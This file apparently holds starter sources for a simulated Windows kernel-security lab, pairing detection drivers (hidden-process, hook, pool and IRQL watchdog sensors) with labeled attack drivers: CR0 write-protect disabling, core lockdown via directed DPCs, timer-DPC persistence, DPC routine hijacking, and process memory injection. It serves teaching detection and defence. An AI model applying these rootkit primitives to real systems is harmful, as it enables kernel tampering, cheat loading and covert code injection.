/**
 * Compiler-lab starter sources. Single home so fixtures for tests are built
 * from the EXACT text students see (see scripts notes in docs/plan.md).
 *
 * Guest-visible constants are deterministic per world and documented in the
 * lesson bodies: build-table offsets (22H2), modeled-list heads, thunk VAs.
 */

export const SENTINEL_V1_STARTER = `// KF-Sentinel v1 - process & module integrity sensor (m1.l4)
//
// Your EDR's first two sensors:
//   1. LIST-vs-CARVE cross-check: walk ActiveProcessLinks, then carve the
//      EPROCESS pool window for image-name signatures. Anything carved but
//      not linked = DKOM-hidden process.
//   2. Unbacked-executable detection: telemetry flagged a pool page full of
//      function prologues; classify it against the loaded-module list.
//
// Deterministic anchors for this world (a real sensor resolves these from
// PDB-backed build tables at runtime):
#include <ntddk.h>

#define OFF_UNIQUE_PROCESS_ID   0x440
#define OFF_ACTIVE_PROC_LINKS   0x448
#define OFF_IMAGE_FILE_NAME     0x5a8
#define PROC_LIST_HEAD          0xffffb80000000000ULL
#define CARVE_BASE              0xffffb80000001000ULL
#define CARVE_LEN               0x8000ULL
#define LDR_HEAD                0x4ff00000ULL     // modeled PsLoadedModuleList
#define PROBE_VA                0xfffff90000020000ULL

static ULONG SentinelListCount(void)
{
    PLIST_ENTRY head = (PLIST_ENTRY)PROC_LIST_HEAD;
    PLIST_ENTRY cur  = head->Flink;
    ULONG n = 0;
    while (cur != head && n < 512) { n++; cur = cur->Flink; }
    return n;
}

static BOOLEAN CarveFindVictim(const CHAR *needle, ULONG len,
                               ULONG64 *pidOut, ULONG64 *vaOut)
{
    // names land at 8-byte alignment inside _EPROCESS (stride 0xA40), so
    // an 8-byte sweep keeps the scan exact without missing candidates
    for (ULONG64 va = CARVE_BASE; va + len < CARVE_BASE + CARVE_LEN; va += 8) {
        PUCHAR p = (PUCHAR)va;
        ULONG i = 0;
        while (i < len && p[i] == (UCHAR)needle[i]) i++;
        if (i == len) {
            ULONG64 eproc = va - OFF_IMAGE_FILE_NAME;
            *pidOut = *(ULONG64 *)(eproc + OFF_UNIQUE_PROCESS_ID);
            *vaOut  = va;
            return TRUE;
        }
    }
    return FALSE;
}

static BOOLEAN ProbeCoveredByModule(ULONG64 va)
{
    PLIST_ENTRY head = (PLIST_ENTRY)LDR_HEAD;
    PLIST_ENTRY cur  = head->Flink;
    ULONG n = 0;
    while (cur != head && n < 128) {
        ULONG64 entry = (ULONG64)cur;
        ULONG64 dllBase = *(ULONG64 *)(entry + 0x30);
        ULONG64 size    = *(ULONG64 *)(entry + 0x40);
        if (dllBase != 0 && va >= dllBase && va < dllBase + size) return TRUE;
        cur = cur->Flink;
        n++;
    }
    return FALSE;
}

NTSTATUS DriverEntry(
    _In_ PDRIVER_OBJECT  DriverObject,
    _In_ PUNICODE_STRING RegistryPath)
{
    UNREFERENCED_PARAMETER(DriverObject);
    UNREFERENCED_PARAMETER(RegistryPath);

    // --- sensor 1: list vs carve -----------------------------------------
    ULONG linked = SentinelListCount();
    DbgPrint("SENTINEL-V1: process list walk -> %u linked entries\\n", linked);

    ULONG64 pid = 0, hitVa = 0;
    if (CarveFindVictim("kftarget", 8, &pid, &hitVa)) {
        DbgPrint("SENTINEL-V1: carve hit 'kftarget.exe' pid=%u @ %p\\n",
                 (unsigned long long)pid, (PVOID)hitVa);
        DbgPrint("SENTINEL-V1: signature present but NOT on the list "
                 "-> DKOM DETECTED\\n");
    } else {
        DbgPrint("SENTINEL-V1: no hidden-process signatures found\\n");
    }

    // --- sensor 2: unbacked executable page -------------------------------
    if (!ProbeCoveredByModule(PROBE_VA)) {
        DbgPrint("SENTINEL-V1: probe page %p holds executable code but is "
                 "covered by NO loaded module -> UNBACKED EXEC DETECTED\\n",
                 (PVOID)PROBE_VA);
    } else {
        DbgPrint("SENTINEL-V1: probe page belongs to a listed module - clean\\n");
    }

    DbgPrint("SENTINEL-V1: sweep complete secret=kf-sentinel-v1-ok\\n");
    return STATUS_SUCCESS;
}
`;

export const SENTINEL_V2_STARTER = `// KF-Sentinel v2 - IRQL watchdog & DPC starvation sensor (m2.l2)
//
// Module 2's rogue driver pinned the processor above DISPATCH_LEVEL so its
// victim stays frozen and queued DPCs never run. Code executing above
// DISPATCH is invisible to many instrumentation callbacks, so the watchdog
// runs where the misbehavior happens: it SAMPLES the IRQL from inside a
// driver and forces the ladder back down.
//
// Real deployments sample from a timer DPC or a periodic work item and
// raise a telemetry event instead of touching the IRQL directly - here you
// get to see both halves of the dance.

#include <ntddk.h>

NTSTATUS DriverEntry(
    _In_ PDRIVER_OBJECT  DriverObject,
    _In_ PUNICODE_STRING RegistryPath)
{
    UNREFERENCED_PARAMETER(DriverObject);
    UNREFERENCED_PARAMETER(RegistryPath);

    KIRQL sampled = KeGetCurrentIrql();
    DbgPrint("SENTINEL-WATCHDOG: sampled IRQL = %u\\n", (int)sampled);

    if (sampled > DISPATCH_LEVEL) {
        DbgPrint("SENTINEL-WATCHDOG: CPU pinned above DISPATCH - threads and "
                 "queued DPCs are starving\\n");
        KeLowerIrql(DISPATCH_LEVEL);
        DbgPrint("SENTINEL-WATCHDOG: ladder restored to %u; stranded DPCs can "
                 "run again (drain with !dpcdrain)\\n", (int)KeGetCurrentIrql());
        DbgPrint("SENTINEL-WATCHDOG: secret=kf-watchdog-ok\\n");
    } else {
        DbgPrint("SENTINEL-WATCHDOG: IRQL within operating range - nothing to do\\n");
    }
    return STATUS_SUCCESS;
}
`;

export const SENTINEL_V3_STARTER = `// KF-Sentinel v3 - prologue attestation engine (m3.l2)
//
// The classic EDR/anticheat control-flow sensor: hash or compare the first
// bytes of every critical kernel export against a known-good baseline taken
// from a clean boot. A single relocated byte is noise; an E9 in position
// zero is an inline detour.
//
// In this world the known-good baseline is trivial (the model materializes
// each export as F4 = HALT marker), but the SHA-256 table you would ship in
// production plays exactly the same role. The import resolves to the
// export's real address inside your kernel - that is all the sensor needs.

#include <ntddk.h>

// known-good baseline (production: sha256 of N prologue bytes per export)
#define BASELINE_FIRST_BYTE 0xF4

static NTSTATUS AttestExport(const char *name, PVOID fn)
{
    PUCHAR prologue = (PUCHAR)fn;
    UCHAR live = prologue[0];
    if (live != BASELINE_FIRST_BYTE) {
        DbgPrint("SENTINEL-ATTEST: %s @ %p FIRST BYTE %02x != baseline %02x "
                 "-> INLINE HOOK DETECTED\\n", name, fn, (int)live,
                 (int)BASELINE_FIRST_BYTE);
        return STATUS_INVALID_IMAGE_HASH;
    }
    DbgPrint("SENTINEL-ATTEST: %s @ %p prologue matches baseline\\n", name, fn);
    return STATUS_SUCCESS;
}

NTSTATUS DriverEntry(
    _In_ PDRIVER_OBJECT  DriverObject,
    _In_ PUNICODE_STRING RegistryPath)
{
    UNREFERENCED_PARAMETER(RegistryPath);

    NTSTATUS worst = STATUS_SUCCESS;

    worst |= AttestExport("PsLookupProcessByProcessId",
                          (PVOID)PsLookupProcessByProcessId);
    worst |= AttestExport("DbgPrint", (PVOID)DbgPrint);

    if (worst != STATUS_SUCCESS) {
        DbgPrint("SENTINEL-ATTEST: control-flow integrity COMPROMISED "
                 "secret=kf-attest-ok\\n");
    }
    return worst;
}
`;

export const SENTINEL_V4_STARTER = `// KF-Sentinel v4 - pool integrity monitor (m4.l2)
//
// Driver Verifier's special pool puts guards around allocations; production
// AC/EDRs go further and sweep guard pages periodically so corruption is
// caught BEFORE the distant bugcheck. Here you sweep the trailing A5 guards
// of three tracked 'KfPb' blocks yourself - the same bytes !poolverify
// audits from the debugger, now enforced by your own driver.
//
// Block layout (deterministic in this world):
//   user VA = POOL_BASE + n * 0x200, size = 0x80, guard @ user_va + size.

#include <ntddk.h>

#define POOL_BASE   0xfffff90000001000ULL
#define STRIDE      0x200
#define BLOCK_SIZE  0x80
#define GUARD_LEN   16
#define GUARD_BYTE  0xA5
#define BLOCKS      3

NTSTATUS DriverEntry(
    _In_ PDRIVER_OBJECT  DriverObject,
    _In_ PUNICODE_STRING RegistryPath)
{
    UNREFERENCED_PARAMETER(DriverObject);
    UNREFERENCED_PARAMETER(RegistryPath);

    ULONG corrupted = 0;
    for (ULONG n = 0; n < BLOCKS; n++) {
        ULONG64 userVa = POOL_BASE + (ULONG64)n * STRIDE;
        PUCHAR guard = (PUCHAR)(userVa + BLOCK_SIZE);
        ULONG bad = GUARD_LEN;
        for (ULONG i = 0; i < GUARD_LEN; i++) {
            if (guard[i] != GUARD_BYTE) { bad = i; break; }
        }
        if (bad != GUARD_LEN) {
            corrupted++;
            DbgPrint("SENTINEL-POOLMON: block %u @ %p guard[%u]=%02x "
                     "CORRUPTED\\n", n, (PVOID)userVa, bad, (int)guard[bad]);
        } else {
            DbgPrint("SENTINEL-POOLMON: block %u @ %p guard intact\\n",
                     n, (PVOID)userVa);
        }
    }

    if (corrupted) {
        DbgPrint("SENTINEL-POOLMON: %u of %d allocations violated - overflow "
                 "in progress somewhere upstream secret=kf-poolmon-ok\\n",
                 corrupted, BLOCKS);
    } else {
        DbgPrint("SENTINEL-POOLMON: pool clean\\n");
    }
    return corrupted ? STATUS_INVALID_BUFFER_SIZE : STATUS_SUCCESS;
}
`;

// ---------------------------------------------------------------------------
// Module 2 attack/defense workshops (m2.l3 / m2.l4). World anchors are the
// KFWARZ_* constants exported from apps/web/src/scenarios.js:
//   kvmdrv.sys base   0xfffff8055a700000
//   victim KDPC       0xfffff8055a701000   ('DPCk' @+0, routine @+0x18)
//   canary page       0xfffff8055a702000   (protected range, 64 bytes)
// ---------------------------------------------------------------------------

export const ATTACK_WPOFF_STARTER = `// ATTACK 1 - WPOFFx64: patch read-only memory inside a raised window (m2.l3)
//
// The classic cheat-loader/rootkit primitive: clear CR0.WP while the core
// sits at DISPATCH_LEVEL so no timer DPC, APC or scheduling slot can
// interleave with the tamper. mov cr0 itself needs no IRQL - the raise buys
// an uninterruptible microsecond, not permission.
//
// In this lab the "read-only" target is kvmdrv.sys's protected canary page.
// After loading, prove the damage from the debugger: '!pgscan' shows both
// the CR0.WP history and the modified bytes.
//
// On the irql-hardened world this same source dies at the WP-clear with a
// modeled CRITICAL_STRUCTURE_CORRUPTION (0x109) - see m2.l4 lab 4.

#include <ntddk.h>

#define CANARY_PAGE 0xfffff8055a702000ULL

static const UCHAR DETOUR[8] = { 0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE };

static UINT64 WPOFF(PKIRQL outIrql)
{
    *outIrql = KeRaiseIrqlToDpcLevel();
    UINT64 cr0 = __readcr0();
    DbgPrint("ATTACK-WPOFF: raised to IRQL %u; CR0 = %p\\n",
             (unsigned)*outIrql, (PVOID)cr0);
    __writecr0(cr0 & ~(1ULL << 16));            // WP off
    _disable();
    DbgPrint("ATTACK-WPOFF: inside window IRQL=%u WP=%u\\n",
             (unsigned)KeGetCurrentIrql(),
             (unsigned)((__readcr0() >> 16) & 1));
    return cr0;
}

static void WPON(KIRQL irql, UINT64 cr0)
{
    __writecr0(cr0);                            // WP back on
    _enable();
    KeLowerIrql(irql);
}

NTSTATUS DriverEntry(
    _In_ PDRIVER_OBJECT  DriverObject,
    _In_ PUNICODE_STRING RegistryPath)
{
    UNREFERENCED_PARAMETER(DriverObject);
    UNREFERENCED_PARAMETER(RegistryPath);

    KIRQL irql;
    UINT64 origCr0 = WPOFF(&irql);

    RtlCopyMemory((void *)CANARY_PAGE, DETOUR, sizeof(DETOUR));
    DbgPrint("ATTACK-WPOFF: detour copied over canary\\n");

    WPON(irql, origCr0);
    DbgPrint("ATTACK-WPOFF: window closed; CR0 restored to %p (IRQL %u)\\n",
             (PVOID)__readcr0(), (unsigned)KeGetCurrentIrql());
    return STATUS_SUCCESS;
}
`;

export const ATTACK_LOCKDOWN_STARTER = `// ATTACK 2 - directed-DPC CPU lockdown (m2.l3)
//
// One core raising itself is per-CPU. To touch structures that other CPUs
// race on, rootkits park EVERY other core at DISPATCH_LEVEL with spinning
// DPCs (KeSetTargetProcessorDpc), work alone, then release. Seconds of
// residency trips the real DPC watchdog - and here too: try '!dpcwatchdog'
// while the cores are pinned.
//
// EXERCISE: load as-is and read '!irql -a'. Then comment out the release
// call, reload, run '!dpcwatchdog' and watch bugcheck 0x133 fire.

#include <ntddk.h>

#define CORES 4

// deterministic world anchor: keep the full-width VA in your source so the
// structural validator can tie your patch site to this world's canary page
#define CANARY_PAGE 0xfffff8055a702000ULL

static KDPC g_lockDpc[CORES];

NTSTATUS DriverEntry(
    _In_ PDRIVER_OBJECT  DriverObject,
    _In_ PUNICODE_STRING RegistryPath)
{
    UNREFERENCED_PARAMETER(DriverObject);
    UNREFERENCED_PARAMETER(RegistryPath);

    KIRQL oldIrql = KeRaiseIrqlToDpcLevel();     // own core -> DISPATCH

    for (ULONG cpu = 1; cpu < CORES; cpu++) {
        KeInitializeDpc(&g_lockDpc[cpu], NULL, NULL);
        KeSetTargetProcessorDpc(&g_lockDpc[cpu], (CHAR)cpu);
        KeInsertQueueDpc(&g_lockDpc[cpu], NULL, NULL);
        DbgPrint("ATTACK-LOCKDOWN: core %u pinned at IRQL %u\\n",
                 (unsigned)cpu, (unsigned)KeQueryPerCpuIrql(cpu));
    }

    DbgPrint("ATTACK-LOCKDOWN: all secondary cores at DISPATCH - kernel "
             "structures exposed\\n");

    // --- release -----------------------------------------------------------
    KfReleaseDirectedDpcs();   // <- comment this line for the 0x133 exercise
    KeLowerIrql(oldIrql);
    DbgPrint("ATTACK-LOCKDOWN: released; core 1 now at IRQL %u\\n",
             (unsigned)KeQueryPerCpuIrql(1));
    return STATUS_SUCCESS;
}
`;

export const ATTACK_TIMERDPC_STARTER = `// ATTACK 3 - timer-DPC persistence (m2.l3)
//
// A KTIMER bound to your DPC re-arms forever: due in 3 ticks, period 5.
// Nothing executes until time passes - advance it from the debugger with
// '!dpcpump 13', then read what happened via '!dpcstat'.
//
// This is why EDRs treat an armed timer whose DeferredRoutine lives in an
// unknown module as persistence, and why '% DPC Time' telemetry exists.

#include <ntddk.h>

static KTIMER g_timer;
static KDPC   g_dpc;
static ULONG  g_runs = 0;

static VOID PayloadRoutine(
    _In_ PKDPC Dpc,
    _In_opt_ PVOID DeferredContext,
    _In_opt_ PVOID SystemArgument1,
    _In_opt_ PVOID SystemArgument2)
{
    UNREFERENCED_PARAMETER(Dpc);
    UNREFERENCED_PARAMETER(DeferredContext);
    UNREFERENCED_PARAMETER(SystemArgument1);
    UNREFERENCED_PARAMETER(SystemArgument2);
    g_runs++;
    DbgPrint("TIMER-PERSIST: payload run #%u at IRQL %u\\n",
             (unsigned)g_runs, (unsigned)KeGetCurrentIrql());
}

NTSTATUS DriverEntry(
    _In_ PDRIVER_OBJECT  DriverObject,
    _In_ PUNICODE_STRING RegistryPath)
{
    UNREFERENCED_PARAMETER(DriverObject);
    UNREFERENCED_PARAMETER(RegistryPath);

    KeInitializeTimer(&g_timer);
    KeInitializeDpc(&g_dpc, PayloadRoutine, NULL);

    LARGE_INTEGER due;
    due.QuadPart = -(LONGLONG)3;            // 3 ticks from now
    KeSetTimerEx(&g_timer, due, 5, &g_dpc); // ...then every 5 ticks

    DbgPrint("TIMER-PERSIST: armed (due +3, period 5); runs so far %u\\n",
             (unsigned)g_runs);
    DbgPrint("TIMER-PERSIST: pump the clock ('!dpcpump 13') to let time happen\\n");
    return STATUS_SUCCESS;
}
`;

export const ATTACK_HIJACK_STARTER = `// ATTACK 4 - KDPC.DeferredRoutine hijack (m2.l3)
//
// The queue stores a pointer; pointers can be rewritten. kvmdrv.sys already
// queued its heartbeat DPC - no allocation, no insertion needed. Overwrite
// DeferredRoutine in place, then retire the queue with '!dpcdrain': the
// retire path re-reads the routine from memory, so YOUR function runs at
// DISPATCH_LEVEL inside the victim's slot.
//
// The drain log prints the live routine next to the insert-time snapshot -
// exactly the forensic artifact defenders grep for. '!pgscan' flags any
// deferred routine pointing outside known modules.

#include <ntddk.h>

#define VICTIM_DPC 0xfffff8055a701000ULL

static VOID HijackRoutine(
    _In_ PKDPC Dpc,
    _In_opt_ PVOID DeferredContext,
    _In_opt_ PVOID SystemArgument1,
    _In_opt_ PVOID SystemArgument2)
{
    UNREFERENCED_PARAMETER(Dpc);
    UNREFERENCED_PARAMETER(DeferredContext);
    UNREFERENCED_PARAMETER(SystemArgument1);
    UNREFERENCED_PARAMETER(SystemArgument2);
    DbgPrint("HIJACK-PAYLOAD: victim slot executing attacker code at IRQL %u\\n",
             (unsigned)KeGetCurrentIrql());
}

NTSTATUS DriverEntry(
    _In_ PDRIVER_OBJECT  DriverObject,
    _In_ PUNICODE_STRING RegistryPath)
{
    UNREFERENCED_PARAMETER(DriverObject);
    UNREFERENCED_PARAMETER(RegistryPath);

    PKDPC victim = (PKDPC)VICTIM_DPC;
    DbgPrint("ATTACK-HIJACK: victim DeferredRoutine was %p\\n",
             (PVOID)victim->DeferredRoutine);
    victim->DeferredRoutine = HijackRoutine;
    DbgPrint("ATTACK-HIJACK: patched in place - retire the queue\\n");
    return STATUS_SUCCESS;
}
`;

export const SENSOR_TELEMETRY_STARTER = `// DEFENSE 1 - telemetry sensor on the pinned world (m2.l4)
//
// Behavior over time beats structure snapshots: a clean EPROCESS list with
// a parked core is still a compromised machine. This sentinel samples the
// IRQL, reads pending-DPC depth (the modeled stand-in for walking
// _KPRCB.DpcData), restores DISPATCH_LEVEL and lets you drain.

#include <ntddk.h>

NTSTATUS DriverEntry(
    _In_ PDRIVER_OBJECT  DriverObject,
    _In_ PUNICODE_STRING RegistryPath)
{
    UNREFERENCED_PARAMETER(DriverObject);
    UNREFERENCED_PARAMETER(RegistryPath);

    KIRQL sampled = KeGetCurrentIrql();
    ULONG depth = KeQueryDpcQueueDepth();
    DbgPrint("SENTINEL-TELEMETRY: sampled IRQL = %u queue-depth = %u\\n",
             (int)sampled, depth);

    if (sampled > DISPATCH_LEVEL || depth > 0) {
        DbgPrint("SENTINEL-TELEMETRY: anomaly - stranded work on a pinned core\\n");
        if (sampled > DISPATCH_LEVEL) KeLowerIrql(DISPATCH_LEVEL);
        DbgPrint("SENTINEL-TELEMETRY: ladder restored to %u secret=kf-watchdog-ok\\n",
                 (int)KeGetCurrentIrql());
    } else {
        DbgPrint("SENTINEL-TELEMETRY: machine healthy\\n");
    }
    return STATUS_SUCCESS;
}
`;

export const SENSOR_DEADLINE_STARTER = `// DEFENSE 2 - self-watchdog deadline alarm (m2.l4)
//
// Anticheats do not trust their own execution context: they schedule a
// watchdog DPC and alarm when it misses its deadline. This driver performs
// the Attack-2 lockdown AND arms a watchdog DPC targeted at a pinned core.
// A healthy core retires it within a tick; a parked one cannot - so the
// deadline slips and the alarm fires. That is the exact signal
// BattlEye/EAC-class products raise when someone steals the scheduler.

#include <ntddk.h>

#define CORES 4

static KDPC   g_lockDpc[CORES];
static KDPC   g_wdDpc;
static KTIMER g_wdTimer;
static LONG   g_fired = 0;

static VOID WatchdogRoutine(
    _In_ PKDPC Dpc,
    _In_opt_ PVOID DeferredContext,
    _In_opt_ PVOID SystemArgument1,
    _In_opt_ PVOID SystemArgument2)
{
    UNREFERENCED_PARAMETER(Dpc);
    UNREFERENCED_PARAMETER(DeferredContext);
    UNREFERENCED_PARAMETER(SystemArgument1);
    UNREFERENCED_PARAMETER(SystemArgument2);
    InterlockedIncrement(&g_fired);
}

NTSTATUS DriverEntry(
    _In_ PDRIVER_OBJECT  DriverObject,
    _In_ PUNICODE_STRING RegistryPath)
{
    UNREFERENCED_PARAMETER(DriverObject);
    UNREFERENCED_PARAMETER(RegistryPath);

    // arm the self-watchdog first: periodic, bound to core 1
    KeInitializeTimer(&g_wdTimer);
    KeInitializeDpc(&g_wdDpc, WatchdogRoutine, NULL);
    KeSetTargetProcessorDpc(&g_wdDpc, 1);
    LARGE_INTEGER due;
    due.QuadPart = -(LONGLONG)2;
    KeSetTimerEx(&g_wdTimer, due, 2, &g_wdDpc);

    // then perform the lockdown (attack primitive as test harness)
    KIRQL oldIrql = KeRaiseIrqlToDpcLevel();
    for (ULONG cpu = 1; cpu < CORES; cpu++) {
        KeInitializeDpc(&g_lockDpc[cpu], NULL, NULL);
        KeSetTargetProcessorDpc(&g_lockDpc[cpu], (CHAR)cpu);
        KeInsertQueueDpc(&g_lockDpc[cpu], NULL, NULL);
    }
    DbgPrint("SENTINEL-WD: cores pinned; core 1 at IRQL %u\\n",
             (unsigned)KeQueryPerCpuIrql(1));

    // let deadlines pass: each tick query advances the modeled clock
    LARGE_INTEGER tick;
    for (int i = 0; i < 12; i++) KeQueryTickCount(&tick);

    if (!g_fired) {
        DbgPrint("SENTINEL-WD: watchdog DPC did not retire within budget "
                 "-> DEADLINE-MISSED\\n");
        DbgPrint("SENTINEL-WD: scheduler stolen - raise telemetry "
                 "secret=kf-deadline-ok\\n");
    } else {
        DbgPrint("SENTINEL-WD: watchdog fired on schedule - healthy core\\n");
    }

    KfReleaseDirectedDpcs();      // unpin everything
    KeCancelTimer(&g_wdTimer);    // stop the watchdog before it spams
    KeLowerIrql(oldIrql);
    return STATUS_SUCCESS;
}
`;

// ---------------------------------------------------------------------------
// m21.l1 — userland injection, both ways (handle-based vs handleless)
export const INJECT_STARTER = `// m21.l1 - userland injection, two footprints
//
// kftarget.exe exposes a game-like code page at 0x7ff600100000. Land a
// payload through BOTH classic paths and compare what each costs:
//
//   path 1  HANDLE-BASED : ZwOpenProcess -> ZwWriteVirtualMemory
//          (a real handle with real access rights; wrong mask = ACCESS_DENIED)
//   path 2  HANDLELESS   : PsLookup + KeStackAttachProcess -> direct write
//          (no handle at all; you borrow the process's own address space)

#include <ntddk.h>

#define INJECT_VA 0x7ff600100000

static const unsigned char PAYLOAD_A[8] = { 'K','F','H','A','N','D','L','E' };
static const unsigned char PAYLOAD_B[8] = { 'K','F','A','T','T','A','C','H' };

NTSTATUS DriverEntry(
    _In_ PDRIVER_OBJECT  DriverObject,
    _In_ PUNICODE_STRING RegistryPath)
{
    UNREFERENCED_PARAMETER(DriverObject);
    UNREFERENCED_PARAMETER(RegistryPath);

    NTSTATUS st;
    HANDLE hProc = NULL;
    OBJECT_ATTRIBUTES oa;
    CLIENT_ID cid;
    PEPROCESS proc = NULL;
    KAPC_STATE apcState;

    // ---- path 1: the handle-based classic --------------------------------
    InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
    cid.UniqueProcess = (HANDLE)888;      // kftarget.exe
    cid.UniqueThread = NULL;

    st = ZwOpenProcess(&hProc, PROCESS_VM_WRITE | PROCESS_VM_OPERATION,
                       &oa, &cid);
    if (!NT_SUCCESS(st)) {
        DbgPrint("INJ: ZwOpenProcess failed %08x\\n", st);
        return st;
    }

    st = ZwWriteVirtualMemory(hProc, (PVOID)INJECT_VA,
                              (PVOID)PAYLOAD_A, sizeof(PAYLOAD_A), NULL);
    DbgPrint("INJ: handle-based write -> %s\\n",
             NT_SUCCESS(st) ? "ok" : "fail");
    ZwClose(hProc);

    // ---- path 2: handleless via attach ------------------------------------
    st = PsLookupProcessByProcessId((HANDLE)888, &proc);
    if (!NT_SUCCESS(st)) {
        DbgPrint("INJ: PsLookup failed %08x\\n", st);
        return st;
    }
    KeStackAttachProcess(proc, &apcState);
    {
        // volatile byte loop: keeps the JS interpreter on scalar instructions
        volatile unsigned char* dst = (volatile unsigned char*)(INJECT_VA + 8);
        for (int i = 0; i < 8; i++) dst[i] = PAYLOAD_B[i];
    }
    KeUnstackDetachProcess(&apcState);
    ObDereferenceObject(proc);
    DbgPrint("INJ: attach-based write -> ok\\n");

    DbgPrint("INJ: secret=kf-ul-inject-ok\\n");
    return STATUS_SUCCESS;
}
`;
